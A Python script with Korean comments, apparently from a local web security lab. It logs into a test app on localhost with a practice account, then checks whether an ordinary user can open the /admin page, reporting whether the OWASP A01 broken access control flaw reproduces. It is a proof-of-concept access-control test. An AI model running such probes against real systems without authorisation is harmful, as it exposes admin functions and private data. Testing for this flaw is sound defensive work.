import requests

# 1. 설정 정보
target_url = "http://127.0.0.1:8080"
login_url = f"{target_url}/login"
admin_url = f"{target_url}/admin"

# 2. 세션 객체 생성
session = requests.Session()

# 3. 로그인 데이터 (제공해주신 패킷의 Body 데이터와 일치시킴)
login_data = {
    "username": "owasp1",
    "password": "11111111"
}

# 헤더 설정 (패킷과 최대한 유사하게 구성)
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
    "Origin": target_url,
    "Referer": login_url
}

print(f"[*] {login_url}에 {login_data['username']} 계정으로 로그인을 시도합니다.")

# 4. 로그인 요청 발송
# allow_redirects=True를 통해 로그인 성공 후 메인 페이지로 이동하도록 함
response = session.post(login_url, data=login_data, headers=headers, allow_redirects=True)

# 로그인 성공 판별 (본문에 '로그아웃'이 있거나 URL이 변경되었는지 확인)
if response.status_code == 200 and ("로그아웃" in response.text or response.url != login_url):
    print(f"[+] 로그인 성공! (현재 URL: {response.url})")
    
    # 5. 관리자 페이지(/admin) 접근 시도
    print(f"[*] 일반 사용자 권한으로 {admin_url} 접속을 시도합니다...")
    # 리다이렉트를 막아야(False) 서버가 200 OK를 주는지 아니면 로그인 페이지로 튕기는지(302) 정확히 알 수 있음
    admin_response = session.get(admin_url, allow_redirects=False)

    print(f"\n[!] 관리자 페이지 응답 상태 코드: {admin_response.status_code}")

    # 6. 취약점 판정
    # 상태 코드가 200이고 내용에 '로그인' 폼이 없다면 취약점 재현 성공
    if admin_response.status_code == 200 and "서비스 로그인" not in admin_response.text:
        print("[!!!] 취약점 재현 성공: 일반 사용자 권한으로 관리자 페이지(A01)에 접근했습니다!")
        print("-" * 50)
        print("[응답 본문 일부 데이터]")
        print(admin_response.text[:500].strip())
        print("-" * 50)
    elif admin_response.status_code in [302, 401, 403]:
        print("[+] 방어 성공: 서버가 접근을 거부하거나 로그인 페이지로 리다이렉트했습니다.")
    else:
        print("[-] 예상치 못한 응답입니다. 관리자 페이지의 실제 소스코드를 확인해 보세요.")
else:
    print("[-] 로그인 실패. 아이디/비밀번호 필드명이나 서버 상태를 다시 확인하세요.")